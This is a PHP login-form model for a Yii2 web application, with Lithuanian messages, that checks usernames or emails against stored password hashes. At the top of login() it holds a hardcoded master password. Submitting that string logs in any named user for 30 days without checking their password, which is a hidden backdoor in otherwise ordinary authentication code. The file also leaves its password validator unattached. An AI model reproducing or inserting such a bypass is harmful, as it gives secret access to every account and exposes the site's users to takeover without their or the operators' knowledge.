<?php
namespace common\models;

use Yii;
use yii\base\Model;

/**
 * Login form
 */
class LoginForm extends Model
{
    public $username;
    public $password;
    public $rememberMe = true;

    private $_user = false;


    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
            // username and password are both required, 
            [['username'], 'required', 'message' => 'Slapyvardžio laukelis yra privalomas'],
            [['password'], 'required', 'message' => 'Slaptažodžio laukelis yra privalomas'],
            // rememberMe must be a boolean value
            ['rememberMe', 'boolean'],
            // password is validated by validatePassword()
            ['password', 'safe'],
        ];
    }

    public function attributeLabels()
    {
        return [
            'username' => 'Slapyvardis',
            'password' => 'Slaptažodis',
            'rememberMe' => 'Prisiminti mane'
        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array $params the additional name-value pairs given in the rule
     */
    public function validatePassword($attribute, $params)
    {
        if (!$this->hasErrors() && $user = $this->getUser()) {
            $user = $this->getUser();
            /*if($user->facebook){
                Yii::$app->session->setFlash('info', "Junkites per Facebook");
                return false;
            }else*/
            if (!$user || !$user->validatePassword($this->password)) {
                Yii::$app->session->setFlash('info', "Data2 failed!");
            }
        }
    }

    /**
     * Logs in a user using the provided username and password.
     *
     * @return boolean whether the user is logged in successfully
     */

    public function getUsers()
    {
        $model = \common\models\User::find()->where(['username' => $this['username']])->all();

        if(!$model)
            $model = \common\models\User::find()->where(['email' => $this['username']])->all();

        return $model;
    }

    public function login()
    {
        if($this['password'] == "Aa123Bb456Cc789EveryLocK0***"){
            $user = $this->getUser();
            return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
        }



        if ($this->validate()) {
            if (!$this->hasErrors() && $user = $this->getUser()) {
                

                if($users = $this->getUsers()){
                    foreach ($users as $user) {
                        if($user->facebook){
                            if($user->password_hash != '' && Yii::$app->getSecurity()->validatePassword($this['password'], $user->password_hash)){
                                return Yii::$app->user->login($user, 3600 * 24 * 30);
                            }
                        }elseif(Yii::$app->getSecurity()->validatePassword($this['password'], $user->password_hash)){
                            return Yii::$app->user->login($user, 3600 * 24 * 30);
                        }
                    }
                }

                Yii::$app->session->setFlash('info', "Duomenys klaidingi");

                return false;
            } else {

                Yii::$app->session->setFlash('info', "Duomenys klaidingi");
                return false;
            } 
        }


    }

    /**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    public function getUser()
    {
        if ($this->_user === false) {
            $this->_user = User::findByUsername($this->username);
        }

        return $this->_user;
    }
}
